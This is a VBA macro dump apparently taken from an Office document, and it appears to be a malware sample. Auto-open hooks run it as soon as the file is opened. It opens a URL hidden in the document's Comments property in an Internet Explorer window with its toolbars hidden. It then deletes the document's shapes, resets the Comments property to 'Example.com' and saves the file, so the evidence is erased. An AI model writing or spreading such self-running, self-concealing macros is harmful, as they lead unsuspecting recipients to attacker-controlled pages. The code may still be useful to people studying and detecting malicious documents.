macros.vba_code:
Public Sub Pause(sngSecs As Single)
Dim sngEnd As Single
sngEnd = Timer + sngSecs
While Timer < sngEnd
DoEvents
Wend
End Sub
Function RunUrl()
Dim objIE As Object
Set objIE = CreateObject("InternetExplorer.Application")
Dim sValue As String
sValue = ActiveDocument.BuiltInDocumentProperties("Comments").Value
objIE.Navigate sValue
objIE.Toolbar = False
objIE.StatusBar = False
objIE.MenuBar = False
Do While ActiveDocument.Shapes.Count > 0
ActiveDocument.Shapes(1).Delete
Loop
ActiveDocument.BuiltInDocumentProperties("Comments").Value = "Example.com"
ActiveDocument.Save
ActiveDocument.Saved = True
Do While objIE.Busy: DoEvents: Loop
Pause 30#
objIE.Quit
End Function
Sub AutoOpen()
RunUrl
End Sub
Sub Document_Open()
RunUrl
End Sub
Sub Auto_Open()
RunUrl
End Sub
Sub Workbook_Open()
RunUrl
End Sub
